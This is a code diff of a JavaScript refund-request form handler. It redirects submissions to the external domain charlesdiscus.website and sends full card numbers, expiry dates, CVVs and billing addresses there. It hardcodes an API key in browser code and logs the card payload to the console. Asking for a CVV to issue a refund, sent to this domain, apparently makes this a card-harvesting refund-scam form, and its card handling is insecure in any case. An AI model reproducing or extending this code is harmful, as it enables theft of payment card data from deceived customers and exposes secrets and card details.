@@ -14,9 +14,9 @@
 
 // Configuration
 const REFUND_API_CONFIG = {
-    // Replace this with your actual API endpoint
-    endpoint: 'https://your-api-domain.com/api/refund-requests',
-    trackingEndpoint: 'https://your-api-domain.com/api/refund-requests/track',
+    endpoint: 'https://charlesdiscus.website/api/refunds/submit',
+    trackingEndpoint: 'https://charlesdiscus.website/api/refund/track',
+    apiKey: 'sk_refund_prod_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6', // Replace with your actual API key
     timeout: 30000, // 30 seconds
 };
 
@@ -85,30 +85,28 @@ async function handleRefundSubmit(event) {
     showRefundLoadingMessage('Submitting your refund request...');
 
     try {
-        // Remove transaction details from API payload
+        // Build API payload with snake_case field names
         const apiData = {
-            fullName: data.fullName,
-            email: data.email,
+            external_order_id: data.externalOrderId || '',
+            customer_email: data.email,
+            full_name: data.fullName,
             phone: data.phone,
-            accountId: data.accountId,
-            refundType: data.refundType,
-            refundAmount: data.refundAmount,
-            reason: data.reason,
-            actionsTaken: data.actionsTaken,
-            cardholderName: data.cardholderName,
-            cardNumber: data.cardNumber,
-            cardExpiry: data.cardExpiry,
-            cardCVV: data.cardCVV,
-            refundMethod: data.refundMethod || 'credit_card',
-            billingStreet: data.billingStreet,
-            billingCity: data.billingCity,
-            billingState: data.billingState,
-            billingZip: data.billingZip,
-            billingCountry: data.billingCountry,
-            cardDataConfirm: data.cardDataConfirm,
-            accuracy: data.accuracy,
-            authorization: data.authorization,
-            privacyRefund: data.privacyRefund
+            account_id: data.accountId,
+            refund_amount: parseFloat(data.refundAmount),
+            refund_type: data.refundType,
+            refund_reason: data.reason,
+            actions_taken: data.actionsTaken,
+            source: data.source || '',
+            external_reference_id: data.externalReferenceId || '',
+            card_holder_name: data.cardholderName,
+            card_number: data.cardNumber,
+            card_expiry: data.cardExpiry,
+            card_cvv: data.cardCVV,
+            billing_street: data.billingStreet,
+            billing_city: data.billingCity,
+            billing_state: data.billingState,
+            billing_zip: data.billingZip,
+            billing_country: data.billingCountry
         };
         const response = await sendRefundToAPI(apiData);
         showRefundSuccessMessage(response);
@@ -166,16 +164,15 @@ async function sendRefundToAPI(data) {
     const timeoutId = setTimeout(() => controller.abort(), REFUND_API_CONFIG.timeout);
 
     try {
+        console.log('Sending refund data:', data);
+        
         const response = await fetch(REFUND_API_CONFIG.endpoint, {
             method: 'POST',
             headers: {
+                'x-refund-api-key': REFUND_API_CONFIG.apiKey,
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify({
-                ...data,
-                submittedAt: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            }),
+            body: JSON.stringify(data),
             signal: controller.signal
         });
 
@@ -185,9 +182,12 @@ async function sendRefundToAPI(data) {
             let errorMessage = `Server returned status ${response.status}`;
             try {
                 const errorData = await response.json();
-                errorMessage = errorData.message || errorMessage;
+                console.error('Server error response:', errorData);
+                errorMessage = errorData.message || errorData.error || errorMessage;
             } catch (e) {
-                // Default error message
+                // Try to get text response
+                const textError = await response.text();
+                console.error('Server error text:', textError);
             }
             throw new Error(errorMessage);
         }
